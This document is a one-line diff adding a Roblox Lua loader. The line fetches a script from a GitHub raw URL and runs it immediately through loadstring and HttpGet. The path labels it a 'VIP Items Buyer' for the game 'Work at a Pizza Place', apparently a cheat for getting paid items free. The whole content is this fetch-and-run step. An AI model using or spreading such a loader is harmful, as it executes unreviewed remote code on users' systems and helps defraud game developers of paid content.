@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hussain1323232234/My-Scripts/main/Work%20at%20a%20pizza%20place%20Vip%20Items%20Buyer"))()
